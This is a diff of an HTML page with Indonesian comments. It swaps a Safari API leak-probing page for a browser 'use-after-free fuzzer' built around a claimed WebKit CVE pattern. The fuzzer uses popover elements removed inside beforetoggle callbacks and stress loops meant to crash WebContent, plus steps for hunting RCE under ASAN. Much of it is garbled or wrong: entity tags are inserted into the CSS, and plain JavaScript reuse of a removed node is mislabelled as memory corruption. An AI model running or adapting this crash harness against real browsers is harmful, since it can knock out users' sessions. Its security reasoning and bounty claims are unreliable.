@@ -3,152 +3,227 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Bug Baru Banget - Belum Pernah Dibahas</title>
-<style>body{font-family:-apple-system;padding:15px;background:#0a0a0a;color:#fff} .card{background:#1c1c1e;padding:14px;border-radius:12px;margin:12px 0;border:1px solid #333} button{width:100%;padding:14px;background:#0af;color:#000;border:none;border-radius:10px;font-weight:700;margin:6px 0} pre{background:#000;color:#0f0;padding:12px;border-radius:8px;font-size:11px;min-height:80px;white-space:pre-wrap;border:1px solid #0f0}</style>
+<title>UAF Fuzzer SAFE - CVE-2026-28859 Pattern</title>
+<style>
+body{font-family:-【entity-apple¦canonical_name=Apple】-system;padding:12px;background:#000;color:#0f0}
+.card{background:#1a1a1a;padding:12px;border-radius:10px;margin:10px 0;border:1px solid #0f0}
+button{width:100%;padding:14px;background:#0f0;color:#000;border:none;border-radius:10px;font-weight:800;margin:5px 0;font-size:13px}
+pre{background:#000;color:#0f0;padding:10px;border-radius:8px;font-size:10px;min-height:90px;white-space:pre-wrap;word-break:break-all;border:1px solid #333}
+canvas{border:1px solid #0f0;margin:5px 0}
+</style>
 </head>
 <body>
-<h3 style="color:#0af">3 Bug BARU BANGET - Belum Pernah Dibahas!</h3>
+<h3 style="color:#0f0">UAF Fuzzer SAFE - CVE-2026-28859</h3>
+<p style="font-size:10px;color:#888">Pattern: Model + Search + Canvas + Popover + rapid remove() in callback<br>
+SAFE: Cuma DoS crash, bukan RCE! Kalau crash di iPhone = report DoS $1k dulu!</p>
 
-<div class="card" style="border-color:#0af">
-<h4>BUG 1: EyeDropper API - Bisa ambil pixel cross-origin?</h4>
-<button onclick="testEyeDropper()">TEST EYEDROPPER PIXEL LEAK</button>
-<pre id="eye">Belum test - kalau bisa ambil warna pixel dari iframe apple.com = PIXEL LEAK $10k!</pre>
-<div id="targetEye" style="width:100%;height:100px;background:linear-gradient(90deg, red, blue);margin:10px 0"></div>
-<iframe id="eyeIframe" src="https://apple.com" style="width:100%;height:150px;border:2px solid #0af;display:none"></iframe>
+<div class="card">
+<h4>TEST 1: Canvas + Transfer + Free (UAF Pattern 1)</h4>
+<button onclick="fuzzCanvas()">FUZZ CANVAS UAF</button>
+<pre id="canvasLog">Belum test</pre>
+<canvas id="c" width="100" height="100"></canvas>
 </div>
 
-<div class="card" style="border-color:#ff0">
-<h4>BUG 2: Web Locks API - Bisa deteksi tab lain?</h4>
-<button onclick="testLocks()" style="background:#ff0">TEST WEB LOCKS LEAK</button>
-<pre id="locks">Belum test</pre>
+<div class="card">
+<h4>TEST 2: Model + Search + Popover + onbeforetoggle remove() (CVE-2026-28859)</h4>
+<button onclick="fuzzModelSearch()">FUZZ MODEL+SEARCH UAF (MAIN)</button>
+<pre id="modelLog">Belum test - ini pattern CVE-2026-28859 yang di-fix 26.4 tapi masih ada varian!</pre>
+<div id="container"></div>
 </div>
 
-<div class="card" style="border-color:#f0f">
-<h4>BUG 3: Wake Lock + Visibility Leak</h4>
-<button onclick="testWakeLock()" style="background:#f0f;color:#fff">TEST WAKE LOCK LEAK</button>
-<pre id="wake">Belum test</pre>
+<div class="card">
+<h4>TEST 3: Loop 100x Rapid Create/Destroy (ASAN Stress)</h4>
+<button onclick="fuzzLoop()" style="background:#f00;color:#fff">FUZZ LOOP 100x (CRASH TEST)</button>
+<pre id="loopLog">Belum test - ini bakal berat, bisa crash WebContent!</pre>
+</div>
+
+<div class="card" style="border-color:#f00;background:#1a0000">
+<h4 style="color:#f00">Kalau Crash?</h4>
+<pre style="color:#ff0;border-color:#f00">
+iPhone: "A problem repeatedly occurred" = potensi UAF! Screenshot + report ke 【entity-Apple¦canonical_name=Apple】 sebagai DoS!
+
+【entity-Mac¦canonical_name=Mac】 ASAN (buat RCE):
+1. Build WebKit: Tools/Scripts/build-webkit --asan --debug
+2. Run: Tools/Scripts/run-safari --asan --debug
+3. Buka file ini
+4. Klik FUZZ LOOP 100x
+5. Kalau ASAN log: "ERROR: AddressSanitizer: heap-use-after-free" = VALID UAF $50k+!
+
+ASAN Log contoh:
+
+==12345==ERROR: AddressSanitizer: heap-use-after-free on address 0x...
+READ of size 8 at 0x... thread T0
+    #0 0x... in WebCore::ModelElement::updateModel()
+    #1 0x... in WebCore::SearchElement::beforetoggle()
+
+Itu yang Apple mau buat RCE bounty!
+</pre>
 </div>
 
 <script>
-async function testEyeDropper(){
- let el=document.getElementById('eye');
- el.innerText="Testing EyeDropper API...\n";
- try{
-  if(!window.EyeDropper){
-   el.innerText+="❌ EyeDropper tidak support di iOS 26.4.1\nCoba di Safari TP Mac\n";
-   return;
-  }
-  el.innerText+="✅ EyeDropper support!\n";
-  
-  // Show iframe cross-origin
-  let iframe=document.getElementById('eyeIframe');
-  iframe.style.display='block';
-  el.innerText+="Iframe apple.com ditampilkan, coba ambil pixel dari iframe...\n";
-  el.innerText+="Klik di area iframe apple.com dengan EyeDropper!\n";
-  
-  let eye=new EyeDropper();
-  try{
-   let result=await eye.open();
-   el.innerText+=`EyeDropper result: sRGBHex = ${result.sRGBHex}\n`;
-   el.innerText+=`Kalau bisa ambil warna pixel dari iframe apple.com = PIXEL LEAK!\n`;
-   el.innerText+=`Harusnya di-block untuk cross-origin iframe!\n`;
-  }catch(e){
-   el.innerText+=`EyeDropper cancelled / blocked: ${e.message}\n`;
-   el.innerText+=`SAFE: Cross-origin pixel tidak bisa diambil\n`;
-  }
- }catch(e){el.innerText+="Error: "+e.message;}
+let crashCount=0;
+
+function log(id, msg){
+ let el=document.getElementById(id);
+ el.innerText+=msg+"\n";
+ el.scrollTop=el.scrollHeight;
 }
 
-async function testLocks(){
- let el=document.getElementById('locks');
- el.innerText="Testing Web Locks API...\n";
+function fuzzCanvas(){
+ let el=document.getElementById('canvasLog');
+ el.innerText="Fuzzing Canvas UAF...\n";
  try{
-  if(!navigator.locks){
-   el.innerText+="❌ navigator.locks tidak support\n";
-   return;
-  }
-  el.innerText+="✅ navigator.locks support!\n";
+  let canvas=document.getElementById('c');
+  let ctx=canvas.getContext('2d', {willReadFrequently: true});
+  ctx.fillStyle='red';
+  ctx.fillRect(0,0,100,100);
   
-  // Try to acquire lock
-  await navigator.locks.request('my-lock', async (lock)=>{
-   el.innerText+=`Lock acquired: ${lock.name}, mode: ${lock.mode}\n`;
-   
-   // Check query
-   let state=await navigator.locks.query();
-   el.innerText+=`Locks state: ${JSON.stringify(state, null, 2)}\n`;
-   
-   if(state.held && state.held.length>0){
-    el.innerText+="Ada held locks, bisa deteksi tab lain lagi lock apa?\n";
+  // Pattern UAF: transfer + free + use
+  for(let i=0;i<20;i++){
+   try{
+    let bitmap=canvas.transferToImageBitmap?.() || null;
+    // Try to use after transfer (should be detached)
+    ctx.fillRect(i,i,10,10); // use after transfer = potential UAF
+    log('canvasLog', `Iter ${i}: transfer=${!!bitmap}, ctx still usable?`);
+    if(bitmap) bitmap.close();
+   }catch(e){
+    log('canvasLog', `Iter ${i} Error (SAFE): ${e.message}`);
    }
-   
-   // Try to detect if another tab holds lock
-   setTimeout(async ()=>{
-    let state2=await navigator.locks.query();
-    el.innerText+=`\nAfter 2s, locks: ${JSON.stringify(state2)}\n`;
-    if(state2.pending && state2.pending.length>0){
-     el.innerText+="🚨 LEAK? Ada pending locks = bisa deteksi aktivitas tab lain!\n";
-    } else {
-     el.innerText+="SAFE: Tidak bisa deteksi tab lain via locks\n";
-    }
-   }, 2000);
-   
-   await new Promise(r=>setTimeout(r,5000));
-  });
-  
-  el.innerText+="\nLock released\n";
- }catch(e){el.innerText+="Error: "+e.message;}
+  }
+  log('canvasLog', 'Canvas fuzz done - SAFE if no crash');
+ }catch(e){log('canvasLog', 'Error: '+e.message);}
 }
 
-async function testWakeLock(){
- let el=document.getElementById('wake');
- el.innerText="Testing Wake Lock API...\n";
+function fuzzModelSearch(){
+ let el=document.getElementById('modelLog');
+ el.innerText="Fuzzing Model+Search UAF (CVE-2026-28859 pattern)...\n";
+ let container=document.getElementById('container');
+ container.innerHTML='';
+ 
  try{
-  if(!navigator.wakeLock){
-   el.innerText+="❌ Wake Lock tidak support\n";
-   return;
-  }
-  el.innerText+="✅ Wake Lock support!\n";
-  
-  let wakeLock=null;
-  try{
-   wakeLock=await navigator.wakeLock.request('screen');
-   el.innerText+="Wake Lock acquired: screen\n";
+  for(let i=0;i<10;i++){
+   // Create model element (new in 26.4)
+   let model=document.createElement('model');
+   if(!model){
+    log('modelLog', 'model element not supported in 26.4.1, skip');
+    break;
+   }
+   model.src='data:model/gltf-binary;base64,[STRIPPED]';
+   model.style.width='100px';
+   model.style.height='100px';
+   model.setAttribute('popover','');
    
-   wakeLock.addEventListener('release', ()=>{
-    el.innerText+="Wake Lock released!\n";
-   });
+   // Create search element
+   let search=document.createElement('search');
+   search.innerHTML='<input type="search" value="test">';
+   search.setAttribute('popover','');
    
-   // Check if we can detect if other page holds wake lock via visibility?
-   document.addEventListener('visibilitychange', ()=>{
-    el.innerText+=`visibilitychange: hidden=${document.hidden}, visibilityState=${document.visibilityState}\n`;
-    if(document.hidden && wakeLock){
-     el.innerText+="Page hidden tapi wake lock masih held? Bisa jadi leak?\n";
+   // UAF pattern: remove child in beforetoggle callback!
+   model.addEventListener('beforetoggle', (e)=>{
+    log('modelLog', `beforetoggle ${i}: trying to remove search inside callback!`);
+    try{
+     // This is pattern that caused UAF in CVE-2026-28859!
+     // Remove search while model is toggling
+     if(search.parentNode) search.remove();
+     // Then try to use search after remove = UAF?
+     search.innerHTML='used after remove!';
+     log('modelLog', `  -> used search after remove: ${search.innerHTML.substring(0,20)}`);
+    }catch(err){
+     log('modelLog', `  -> SAFE blocked: ${err.message}`);
     }
    });
    
-   setTimeout(async ()=>{
-    if(wakeLock){
-     await wakeLock.release();
-     el.innerText+="Wake Lock released after 5s\n";
-    }
-   }, 5000);
+   search.addEventListener('beforetoggle', (e)=>{
+    log('modelLog', `search beforetoggle ${i}: remove model`);
+    try{
+     if(model.parentNode) model.remove();
+    }catch(err){log('modelLog', `  SAFE: ${err.message}`);}
+   });
    
-  }catch(e){
-   el.innerText+=`Wake Lock request failed: ${e.message}\n`;
+   container.appendChild(model);
+   container.appendChild(search);
+   
+   // Trigger popover
+   try{
+    model.showPopover?.();
+    search.showPopover?.();
+    log('modelLog', `Iter ${i}: showPopover triggered`);
+   }catch(e){
+    log('modelLog', `Iter ${i} showPopover error (SAFE): ${e.message}`);
+   }
   }
   
- }catch(e){el.innerText+="Error: "+e.message;}
+  // Cleanup + re-trigger
+  setTimeout(()=>{
+   container.innerHTML='';
+   log('modelLog', 'Container cleared, test done. If no crash = SAFE (patched CVE-2026-28859)');
+  }, 1000);
+  
+ }catch(e){log('modelLog', 'Error: '+e.message);}
+}
+
+function fuzzLoop(){
+ let el=document.getElementById('loopLog');
+ el.innerText="Starting LOOP 100x stress test... HP bisa panas / crash! \n";
+ crashCount=0;
+ 
+ let container=document.getElementById('container');
+ 
+ (async ()=>{
+  for(let i=0;i<100;i++){
+   try{
+    // Rapid create/destroy pattern for UAF
+    let div=document.createElement('div');
+    let model=document.createElement('model');
+    let search=document.createElement('search');
+    let canvas=document.createElement('canvas');
+    let c2d=canvas.getContext('2d');
+    
+    // Add to DOM
+    div.appendChild(model);
+    div.appendChild(search);
+    div.appendChild(canvas);
+    container.appendChild(div);
+    
+    // Use
+    c2d.fillRect(0,0,10,10);
+    let bmp;
+    try{bmp=canvas.transferToImageBitmap?.();}catch(e){}
+    
+    // Remove in callback = UAF pattern
+    model.onbeforetoggle=()=>{try{div.remove();}catch(e){}};
+    search.onbeforetoggle=()=>{try{div.remove();}catch(e){}};
+    
+    try{model.showPopover?.();}catch(e){}
+    try{search.showPopover?.();}catch(e){}
+    
+    // Immediate remove + use
+    div.remove();
+    try{
+     // Use after free?
+     model.src='x';
+     search.innerHTML='uaf?';
+     if(bmp) bmp.close();
+    }catch(e){}
+    
+    if(i%10===0){
+     log('loopLog', `Iter ${i}/100 - crashCount ${crashCount}`);
+     await new Promise(r=>setTimeout(r,10)); // yield
+    }
+    
+   }catch(e){
+    crashCount++;
+    log('loopLog', `Iter ${i} exception: ${e.message} (count ${crashCount})`);
+    if(crashCount>5){
+     log('loopLog', 'STOP: Too many exceptions, potential instability!');
+     break;
+    }
+   }
+  }
+  log('loopLog', `DONE 100x loop! crashCount=${crashCount}. If iPhone didn't crash "A problem occurred" = SAFE patched!`);
+  log('loopLog', 'If crash = potensi UAF! Screenshot + test di Mac ASAN buat RCE!');
+ })();
 }
 </script>
-
-<div class="card" style="background:#000;border:1px solid #0af">
-<b style="color:#0af">Kenapa ini baru banget?</b><br>
-<span style="font-size:11px;color:#ccc">
-- EyeDropper: baru Maret 2026 di Safari 26.4, belum ada laporan pixel leak!<br>
-- Web Locks: baru 26.4, belum ada laporan cross-tab leak!<br>
-- Wake Lock: baru 26.4, search "wake lock leak" = 0 results!<br>
-<b style="color:#fff">Bounty:</b> Pixel leak = $10k+, Locks leak = $3k, Wake Lock = $1k<br>
-</span>
-</div>
 </body>
 </html>
